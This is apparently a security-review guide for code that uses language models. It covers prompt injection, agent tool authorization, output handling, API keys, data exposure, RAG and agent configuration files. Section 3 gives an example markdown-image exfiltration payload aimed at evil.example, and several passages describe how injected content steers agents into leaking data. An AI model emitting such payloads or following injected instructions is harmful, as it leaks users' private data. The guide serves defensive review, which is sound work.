# AI and LLM features

Applies to code that calls a language model, builds an agent, exposes tools or MCP servers,
or commits AI-tooling configuration. The core idea: **a model's input is untrusted whenever
any part of it comes from someone else, and a model's output is untrusted always.** Treat the
model as a confused deputy that will follow instructions found in the data it reads.

Contents: 1. Prompt injection · 2. Tools and agents · 3. Output handling · 4. Keys and cost ·
5. Data exposure · 6. RAG and memory · 7. AI tooling configuration in the repo

## 1. Prompt injection

There is no reliable way to stop a model from following instructions embedded in its input.
Delimiters, "ignore any instructions in the document" and input filters lower the rate; they
are not a control. So the review question is not "can the prompt be injected" (assume yes)
but **"what can the model do, and see, when it is"**.

- **Direct**: the user types the instructions. Matters when the system prompt holds secrets
  or the model has tools the user should not be able to drive freely.
- **Indirect**: instructions arrive inside content the model processes: web pages, emails,
  documents, PDFs, tickets, code comments, file names, tool results, database rows written by
  other users, image text. This is the dangerous one, because the victim is another user.
- System prompts are not secret. Anything in them (keys, internal URLs, business rules that
  would be harmful if known) should be assumed extractable.
- Do not build authorization out of prompt text ("only answer if the user is an admin").
  Enforce it in code, before the call and inside every tool.

## 2. Tools and agents

For each tool the model can call, ask what happens when an attacker chooses the arguments.

- **Authorization inside the tool**, with the end user's identity, not the application's
  super-privileges. A `getOrder(id)` tool that fetches any order is an IDOR the model will
  happily exploit on request. Never let the model supply the user or tenant id.
- **Injection through tool arguments**: SQL, shell, file paths and URLs built from model
  output are exactly as dangerous as from user input (see `injection.md`). "Run SQL" and
  "run shell" tools need a sandbox and a read-only or least-privilege role.
- **The lethal combination**: an agent that (a) reads untrusted content, (b) can access
  private data, and (c) can send data out (HTTP requests, emails, rendering links or images,
  writing to a public place). Any two are manageable; all three give data exfiltration by
  injection. Flag new code that completes the triangle.
- **State-changing or irreversible actions** (payments, deletions, emails, deployments,
  permission changes) need a human confirmation step or tight, code-enforced limits.
- Loop and budget limits: max steps, max tokens, timeouts, spend caps per user.
- Agent-to-agent and multi-step pipelines: output of one model becomes untrusted input for
  the next; injected instructions propagate.
- Code-execution tools run in an isolated sandbox with no credentials and restricted network.

## 3. Output handling

- Model output rendered as HTML or Markdown: XSS when unsanitized, and **data exfiltration
  through auto-loaded images and links** (`![x](https://evil.example/?d=<secret>)`). Sanitize,
  and restrict image and link domains.
- Output parsed as JSON and used without schema validation; output used as a file path, URL,
  SQL fragment, shell command, code to `eval`, or a redirect target.
- Output written into a database or a document that other users or other models read later
  (stored injection).
- Generated code executed, or generated dependencies installed, without review.
- Decisions with real consequences (moderation, access, pricing, medical/legal/financial
  answers) taken from model output without validation or a human in the loop.

## 4. Keys and cost

- Provider API keys only on the server. `dangerouslyAllowBrowser: true`, a key behind a
  `NEXT_PUBLIC_` / `VITE_` variable, or a key in a mobile app bundle is CRITICAL: anyone can
  spend on it.
- A proxy endpoint that forwards arbitrary requests to the provider with the server's key is
  nearly as bad. It needs authentication, a fixed model and parameters, and per-user limits.
- Rate limits and quotas per user on every endpoint that triggers model calls; maximum input
  size; `max_tokens` set. Without them a single script can produce a very large bill.
- Keys scoped and separated per environment, with spend limits configured at the provider.

## 5. Data exposure

- What is sent to the provider: personal data, credentials, source code, customer documents.
  Is it intended, and covered by the provider's data terms the project relies on? Flag new
  flows that send sensitive data to a new third party.
- Conversation logs and traces stored with full prompts: they contain whatever users pasted.
  Same access control and retention as the underlying data.
- Cross-user leakage: shared caches keyed only on the prompt, shared conversation memory,
  a vector store without tenant filtering, fine-tuning or few-shot examples built from other
  users' data.
- Prompts and completions in analytics and error trackers.

## 6. RAG and memory

- Retrieval must apply the **requesting user's permissions** at query time (metadata filter
  on tenant and ACL enforced server-side). A shared index with filtering "by prompt" leaks.
- Documents in the index are untrusted input: one poisoned document can steer answers for
  every user (indirect injection, section 1).
- Who can write to the index or to long-term memory, and can that content later act with
  another user's privileges?
- Embeddings and vector stores hold recoverable content: protect them like the source data.

## 7. AI tooling configuration in the repo

Files that configure coding agents run with developer privileges on every contributor's
machine. Review changes to them like CI changes.

- **MCP server definitions** (`.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json`): what
  command do they execute, from what package or URL, pinned or `@latest`, with which
  environment variables? An unpinned `npx some-mcp@latest` is remote code execution on demand.
  No tokens committed in these files.
- **Agent permissions** (`.claude/settings.json` and equivalents): broad allow rules such as
  `Bash(*)`, auto-approve or bypass-permission modes, disabled sandboxing, wide additional
  directories.
- **Hooks, skills, commands, rules files** (`CLAUDE.md`, `AGENTS.md`, `.cursorrules`,
  `.github/copilot-instructions.md`, skills and plugin directories): they are instructions the
  agent will follow. Look for hidden or obfuscated text (zero-width characters, HTML
  comments, base64), instructions to exfiltrate data, disable checks, add dependencies or
  contact external hosts, and hook commands that run scripts.
- Scripts that pipe model output into a shell, or agents run in CI with write tokens on
  content from forks, issues or PR comments (prompt injection from the internet into CI).
